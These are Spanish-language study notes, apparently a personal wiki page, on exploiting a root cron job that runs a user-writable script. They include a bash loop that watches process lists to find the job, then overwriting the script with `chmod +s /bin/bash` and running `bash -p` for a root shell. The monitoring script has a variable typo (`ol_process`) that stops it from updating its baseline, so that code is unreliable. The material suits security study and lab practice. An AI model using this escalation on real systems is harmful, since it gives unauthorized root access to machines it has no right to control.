Una tarea [[Archivos#Cron|Cron]] se encargar de ejecutar ciertos algoritmos cada cierto tiempo.

Primero vamos agregar una nueva tarea cron y inicar el servicio, las tareas se ubican en ` /etc/cron.d ` y deben de contener una [[Archivos#Estructura de tiempos|Estrucutra]].

``` bash
#Estructura por defecto(1 min)
* * * * * root /home/s4tisfacti0n/file.sh
```

Ah este punto la tarea cron esta lista, creamos el archivo y le damos permisos *x* y *w*.

**Explotacion**
Como podemos identificar una tarea cron? con `ps -eo command` podemos vizualizar los comandos que se estan ejecutando en tiempo real.
Para esto realizaremos un pequeño script.

``` bash
 1 #!/bin/bash
 2
 3 old_process=$(ps -eo command)
 4
 5
 6 while true; do
 7     new_process=$(ps -eo command)
 8     diff <(echo "$old_process") <(echo "$new_process") | grep  "[\>\<]" | grep -v "kworker"
 9     ol_process=$new_process
10 done
```

Una vez que ejecutemos nuestro script podemos vizualizar la tarea cron que hemos creado, ahora a explotar esta *recordar que el file.sh ejecutado tiene permisos e escritura asi que lo podemos modificar*.

Como la tarea cron se esta ejecutando como root lo que vamos hacer es asignar permisos *suid* a la `/bin/bash`.
``` bash
 1 #!/bin/bash
 2
 3 chmod +s /bin/bash
```

Ahora con un usuario no privilegiado abriremos una bash.

	bash -p
-p *Para forzar los permisos que tiene*


